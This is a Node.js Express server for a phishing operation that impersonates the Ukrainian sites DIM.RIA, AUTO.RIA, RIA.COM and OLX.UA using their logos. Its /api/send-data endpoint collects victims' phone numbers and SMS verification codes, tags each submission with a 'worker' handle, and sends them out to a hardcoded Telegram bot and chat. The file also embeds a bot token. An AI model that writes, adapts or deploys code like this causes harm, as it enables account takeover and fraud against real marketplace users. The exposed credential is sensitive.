const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_TOKEN = "8227870538:AAG6O3ojYrxz_COPKCkgUZy-GYSYxRfNKuc";
const CHAT_ID = "-1003473672730";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

app.use(bodyParser.json());
app.use(express.static(__dirname));

// === ЛОГОТИПИ ===
const LOGOS = {
    dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
    autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
    ria: "https://ria.riastatic.com/dist/img/logo900.png",
    olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
};

const PROJECT_NAMES = {
    dimria: "DIM.RIA",
    autoria: "AUTO.RIA",
    ria: "RIA.COM",
    olx: "OLX.UA"
};

app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!['dimria', 'autoria', 'ria', 'olx'].includes(project)) {
        return res.status(400).send('Невідомий проект');
    }
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    const logo = LOGOS[project] || LOGOS.dimria;
    res.redirect(logo);
});

app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));

async function sendToTelegram(message) {
    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
    for (let i = 0; i < 3; i++) {
        try {
            const res = await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                timeout: 10000
            });
            const result = await res.json();
            if (res.ok && result.ok) return true;
            console.error('Telegram error:', result);
            if (result.error_code === 403) return false;
        } catch (err) {
            console.error(`Попытка ${i + 1}:`, err.message);
            if (i === 2) return false;
            await new Promise(r => setTimeout(r, 2000));
        }
    }
    return false;
}

app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, worker, project = 'dimria', city = 'Невідомо' } = req.body;

    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';

    let message = '';

    if (step === 'phone' && phone) {
        message = `*ПРОЕКТ:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Місто:* ${city}\n*Країна:* Україна`;
        if (worker) message += `\n*Воркер:* @${worker}`;
    } 
    else if (step === 'code' && code) {
        message = `*SMS КОД:* \`${code}\`\n*ПРОЕКТ:* ${projectName}\n*Місто:* ${city}`;
        if (worker) message += `\n*Воркер:* @${worker}`;
    } 
    else {
        return res.status(400).json({ success: false });
    }

    const ok = await sendToTelegram(message);
    res.json({ success: ok });
});

app.listen(PORT, () => {
    console.log(`Сервер: http://localhost:${PORT}`);
    console.log(`Панель: http://localhost:${PORT}/panel`);
    setTimeout(() => {
        sendToTelegram(`*Проекты успешно стали на сервер* ✅\nНаши проекты: DIM.RIA / AUTO.RIA / RIA.COM / OLX.UA`);
    }, 3000);
});
